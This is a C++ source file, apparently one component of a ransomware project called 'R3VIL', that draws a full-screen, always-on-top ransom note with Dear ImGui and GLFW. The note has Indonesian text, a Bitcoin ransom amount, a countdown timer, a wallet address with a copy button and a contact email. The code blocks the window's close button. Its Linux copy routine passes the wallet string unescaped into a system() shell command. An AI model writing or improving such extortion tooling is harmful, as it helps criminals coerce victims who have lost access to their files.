// src/ransom_gui.cpp
#include "ransom_gui.h"
#include "imgui.h"
#include "imgui_impl_glfw.h"
#include "imgui_impl_opengl3.h"
#include <GLFW/glfw3.h>
#include <iostream>
#include <chrono>
#include <thread>
#include <cstring>

#ifdef _WIN32
#include <windows.h>
#endif

RansomGUI::RansomGUI() 
    : ransom_amount(500.0), remaining_hours(72) {}

RansomGUI::~RansomGUI() {
    stop();
}

void RansomGUI::start(const std::string& btc, const std::string& mail, double usd, int hours) {
    btc_address = btc;
    email = mail;
    ransom_amount = usd;
    remaining_hours = hours;
    start_time = std::chrono::steady_clock::now();

    if (!running) {
        running = true;
        gui_thread = std::thread(&RansomGUI::guiThread, this);
    }
}

void RansomGUI::stop() {
    running = false;
    if (gui_thread.joinable()) {
        gui_thread.join();
    }
}

void RansomGUI::guiThread() {
    if (!glfwInit()) {
        std::cerr << "[GUI] GLFW initialization failed!\n";
        return;
    }

    // Pengaturan window: Borderless + Always on Top
    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);
    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 3);
    glfwWindowHint(GLFW_OPENGL_PROFILE, GLFW_OPENGL_CORE_PROFILE);
    glfwWindowHint(GLFW_DECORATED, GLFW_FALSE);      // Hilangkan titlebar & border
    glfwWindowHint(GLFW_RESIZABLE, GLFW_FALSE);
    glfwWindowHint(GLFW_FLOATING, GLFW_TRUE);        // Always on top

    GLFWmonitor* primary = glfwGetPrimaryMonitor();
    const GLFWvidmode* mode = glfwGetVideoMode(primary);

    GLFWwindow* window = glfwCreateWindow(mode->width, mode->height, 
                                          "R3VIL - YOUR FILES ARE ENCRYPTED", 
                                          primary, nullptr);

    if (!window) {
        std::cerr << "[GUI] Failed to create GLFW window!\n";
        glfwTerminate();
        return;
    }

    glfwMakeContextCurrent(window);
    glfwSwapInterval(1); // VSync

    // Setup Dear ImGui
    IMGUI_CHECKVERSION();
    ImGui::CreateContext();
    ImGuiIO& io = ImGui::GetIO(); (void)io;

    ImGui::StyleColorsDark();

    ImGui_ImplGlfw_InitForOpenGL(window, true);
    ImGui_ImplOpenGL3_Init("#version 330");

    // Cegah window ditutup dengan tombol close (Alt+F4 tetap sulit di Linux)
    glfwSetWindowCloseCallback(window, [](GLFWwindow* w) {
        glfwSetWindowShouldClose(w, GLFW_FALSE);
    });

    while (running && !glfwWindowShouldClose(window)) {
        glfwPollEvents();

        ImGui_ImplOpenGL3_NewFrame();
        ImGui_ImplGlfw_NewFrame();
        ImGui::NewFrame();

        renderFrame();

        ImGui::Render();
        int display_w, display_h;
        glfwGetFramebufferSize(window, &display_w, &display_h);
        glViewport(0, 0, display_w, display_h);
        glClearColor(0.0f, 0.0f, 0.0f, 1.0f);
        glClear(GL_COLOR_BUFFER_BIT);

        ImGui_ImplOpenGL3_RenderDrawData(ImGui::GetDrawData());
        glfwSwapBuffers(window);

        std::this_thread::sleep_for(std::chrono::milliseconds(16)); // ~60 FPS
    }

    // Cleanup
    ImGui_ImplOpenGL3_Shutdown();
    ImGui_ImplGlfw_Shutdown();
    ImGui::DestroyContext();
    glfwDestroyWindow(window);
    glfwTerminate();
}

void RansomGUI::renderFrame() {
    // Hitung countdown real-time
    auto now = std::chrono::steady_clock::now();
    auto elapsed = std::chrono::duration_cast<std::chrono::hours>(now - start_time).count();
    int current_hours = std::max(0, remaining_hours - static_cast<int>(elapsed));

    ImGui::SetNextWindowPos(ImVec2(0, 0));
    ImGui::SetNextWindowSize(ImGui::GetIO().DisplaySize);

    ImGui::Begin("=== R3VIL RANSOMWARE ===", nullptr,
        ImGuiWindowFlags_NoTitleBar |
        ImGuiWindowFlags_NoResize |
        ImGuiWindowFlags_NoMove |
        ImGuiWindowFlags_NoCollapse |
        ImGuiWindowFlags_NoScrollbar |
        ImGuiWindowFlags_NoBringToFrontOnFocus);

    // Judul Besar Merah
    ImGui::PushStyleColor(ImGuiCol_Text, IM_COL32(255, 60, 60, 255));
    ImGui::Text("YOUR FILES HAVE BEEN ENCRYPTED");
    ImGui::PopStyleColor();

    ImGui::Separator();

    ImGui::TextWrapped("Semua file penting Anda telah dienkripsi menggunakan kombinasi AES-256 dan RSA-2048.");
    ImGui::TextWrapped("File-file tersebut tidak dapat dibuka tanpa kunci dekripsi.");

    ImGui::Spacing();
    ImGui::Spacing();

    ImGui::TextColored(ImVec4(1.0f, 0.8f, 0.0f, 1.0f), "Jumlah Tebusan: $%.0f USD (Bitcoin)", ransom_amount);

    // Countdown
    ImGui::TextColored(ImVec4(1.0f, 1.0f, 0.0f, 1.0f), 
                       "Waktu Tersisa: %d jam", current_hours);

    if (current_hours <= 24) {
        ImGui::TextColored(ImVec4(1.0f, 0.3f, 0.3f, 1.0f), "!!! WAKTU HAMPIR HABIS !!!");
    }

    ImGui::Spacing();
    ImGui::Text("Bitcoin Address:");

    // Buffer untuk InputText (Read Only)
    char btc_buffer[100];
    strncpy(btc_buffer, btc_address.c_str(), sizeof(btc_buffer) - 1);
    btc_buffer[sizeof(btc_buffer) - 1] = '\0';

    ImGui::InputText("##btc", btc_buffer, sizeof(btc_buffer), ImGuiInputTextFlags_ReadOnly);

    if (ImGui::Button("Copy Bitcoin Address", ImVec2(-1.0f, 45.0f))) {
#ifdef _WIN32
        if (OpenClipboard(nullptr)) {
            EmptyClipboard();
            HGLOBAL hg = GlobalAlloc(GMEM_MOVEABLE, btc_address.size() + 1);
            if (hg) {
                memcpy(GlobalLock(hg), btc_address.c_str(), btc_address.size() + 1);
                GlobalUnlock(hg);
                SetClipboardData(CF_TEXT, hg);
            }
            CloseClipboard();
        }
#else
        // Linux (xclip atau wl-copy)
        std::string cmd = "echo -n '" + btc_address + "' | xclip -selection clipboard 2>/dev/null || "
                          "echo -n '" + btc_address + "' | wl-copy 2>/dev/null || "
                          "echo '" + btc_address + "' > /tmp/revil_wallet.txt";
        system(cmd.c_str());
#endif
        ImGui::OpenPopup("CopiedPopup");
    }

    // Popup "Copied"
    if (ImGui::BeginPopup("CopiedPopup")) {
        ImGui::Text("Alamat Bitcoin berhasil disalin ke clipboard!");
        ImGui::EndPopup();
    }

    ImGui::Spacing();
    ImGui::Text("Setelah membayar, kirim bukti transaksi ke:");
    ImGui::TextColored(ImVec4(0.6f, 1.0f, 0.6f, 1.0f), "%s", email.c_str());

    ImGui::Separator();

    ImGui::TextColored(ImVec4(1.0f, 0.4f, 0.4f, 1.0f),
        "PERINGATAN:\n"
        "• Jangan hapus file dengan ekstensi .revil\n"
        "• Jangan gunakan software decrypt lain\n"
        "• Pembayaran hanya diterima dalam Bitcoin");

    ImGui::End();
}
